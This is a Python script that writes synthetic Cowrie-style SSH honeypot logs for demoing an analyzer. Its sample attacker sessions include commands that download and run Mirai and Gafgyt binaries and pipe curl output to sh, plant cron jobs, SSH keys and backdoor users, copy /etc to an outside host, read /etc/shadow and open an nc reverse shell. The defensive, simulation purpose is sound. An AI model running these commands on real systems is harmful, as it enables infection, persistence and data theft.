#!/usr/bin/env python3
"""
generate_sample_data.py

Generates a synthetic Cowrie-style honeypot log (JSON Lines) so the
analyzer can be demoed without a live honeypot. The event schema mirrors
real Cowrie output: cowrie.session.connect, cowrie.login.{success,failed},
cowrie.command.input, cowrie.session.closed.

Usage:
    python scripts/generate_sample_data.py > sample_data/cowrie_sample.jsonl
"""

import json
import random
import uuid
from datetime import datetime, timedelta

random.seed(42)

SRC_IPS = [
    "185.220.101.45", "45.155.205.233", "194.180.48.211", "103.145.13.68",
    "91.240.118.172", "185.156.73.54", "223.71.167.166", "80.94.95.116",
    "165.22.94.201", "192.241.220.187", "5.188.62.140", "89.248.165.74",
    "141.98.11.27", "62.171.177.100", "198.98.51.189",
]

USERNAMES = ["root", "admin", "user", "test", "ubuntu", "pi", "oracle", "guest"]
PASSWORDS = ["123456", "admin", "password", "root", "12345678", "qwerty", "raspberry", ""]

COMMAND_SETS = {
    "reconnaissance": [
        ["whoami", "uname -a", "cat /proc/cpuinfo", "ls -la /", "cat /etc/passwd", "ifconfig", "exit"],
        ["id", "uname -a", "cat /etc/issue", "ps aux", "df -h", "exit"],
        ["whoami", "pwd", "ls -la", "cat /proc/version", "netstat -an", "exit"],
    ],
    "credential_stuffing": [
        [],  # brute force sessions are mostly login attempts, few/no commands
        ["exit"],
    ],
    "malware_download": [
        ["cd /tmp", "wget http://45.33.32.156/bins/mirai.arm -O - > mirai.arm",
         "chmod 777 mirai.arm", "./mirai.arm", "rm -rf mirai.arm"],
        ["cd /dev/shm", "curl -o gafgyt http://194.61.4.13/gafgyt.x86",
         "chmod +x gafgyt", "./gafgyt selfrep", "history -c"],
        ["busybox wget http://185.216.140.6/bot.sh -O /tmp/bot.sh",
         "chmod +x /tmp/bot.sh", "sh /tmp/bot.sh"],
    ],
    "cryptomining": [
        ["cd /tmp", "wget http://cryptopool.example.net/xmrig -O xmrig",
         "chmod +x xmrig", "./xmrig -o stratum+tcp://pool.minexmr.com:4444 -u 49xR7q...wallet"],
        ["curl -s http://minerhost.example/install.sh | sh",
         "nohup ./minerd -a cryptonight -o stratum+tcp://xmr.pool.net:3333 &"],
    ],
    "persistence": [
        ["mkdir -p ~/.ssh", "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC...' >> ~/.ssh/authorized_keys",
         "crontab -l", "(crontab -l; echo '* * * * * curl -s http://evil.example/cron.sh|sh') | crontab -"],
        ["useradd -m sysupdate", "echo 'sysupdate:P@ssw0rd123' | chpasswd", "usermod -aG sudo sysupdate"],
    ],
    "exfiltration": [
        ["tar czf /tmp/data.tar.gz /etc", "scp /tmp/data.tar.gz root@45.33.1.14:/tmp/",
         "rm -f /tmp/data.tar.gz"],
        ["cat /etc/shadow", "nc -e /bin/sh 45.33.1.14 4444"],
    ],
    "low_activity": [
        [],
        ["exit"],
        ["ls"],
    ],
}

# (category, weight, login_success_rate, min_failed_logins, max_failed_logins)
CATEGORY_PROFILE = [
    ("reconnaissance", 14, 0.9, 1, 3),
    ("credential_stuffing", 16, 0.15, 4, 12),
    ("malware_download", 10, 0.85, 1, 2),
    ("cryptomining", 6, 0.9, 1, 2),
    ("persistence", 5, 0.9, 1, 2),
    ("exfiltration", 5, 0.8, 1, 2),
    ("low_activity", 10, 0.4, 1, 4),
]


def weighted_category():
    total = sum(w for _, w, *_ in CATEGORY_PROFILE)
    r = random.uniform(0, total)
    upto = 0
    for cat, w, succ_rate, lo, hi in CATEGORY_PROFILE:
        if upto + w >= r:
            return cat, succ_rate, lo, hi
        upto += w
    return CATEGORY_PROFILE[-1][0], *CATEGORY_PROFILE[-1][2:]


def gen_session(start_time):
    category, succ_rate, lo_fail, hi_fail = weighted_category()
    src_ip = random.choice(SRC_IPS)
    session_id = uuid.uuid4().hex[:12]
    t = start_time
    events = []

    events.append({
        "eventid": "cowrie.session.connect",
        "session": session_id,
        "src_ip": src_ip,
        "src_port": random.randint(1024, 65000),
        "dst_port": 2222,
        "protocol": "ssh",
        "timestamp": t.isoformat() + "Z",
    })

    n_failed = random.randint(lo_fail, hi_fail)
    login_success = random.random() < succ_rate
    for _ in range(n_failed):
        t += timedelta(seconds=random.uniform(0.3, 2.0))
        events.append({
            "eventid": "cowrie.login.failed",
            "session": session_id,
            "username": random.choice(USERNAMES),
            "password": random.choice(PASSWORDS),
            "timestamp": t.isoformat() + "Z",
        })

    if login_success:
        t += timedelta(seconds=random.uniform(0.3, 2.0))
        events.append({
            "eventid": "cowrie.login.success",
            "session": session_id,
            "username": random.choice(USERNAMES),
            "password": random.choice(PASSWORDS),
            "timestamp": t.isoformat() + "Z",
        })

        commands = random.choice(COMMAND_SETS[category])
        for cmd in commands:
            t += timedelta(seconds=random.uniform(1.0, 8.0))
            events.append({
                "eventid": "cowrie.command.input",
                "session": session_id,
                "input": cmd,
                "timestamp": t.isoformat() + "Z",
            })

    t += timedelta(seconds=random.uniform(0.5, 3.0))
    duration = round((t - start_time).total_seconds(), 2)
    events.append({
        "eventid": "cowrie.session.closed",
        "session": session_id,
        "duration": duration,
        "timestamp": t.isoformat() + "Z",
    })

    return events


def main(n_sessions=90):
    base_time = datetime(2026, 8, 18, 0, 0, 0)
    all_events = []
    for i in range(n_sessions):
        start = base_time + timedelta(minutes=random.uniform(0, 60 * 40))
        all_events.extend(gen_session(start))

    all_events.sort(key=lambda e: e["timestamp"])
    for e in all_events:
        print(json.dumps(e))


if __name__ == "__main__":
    main()
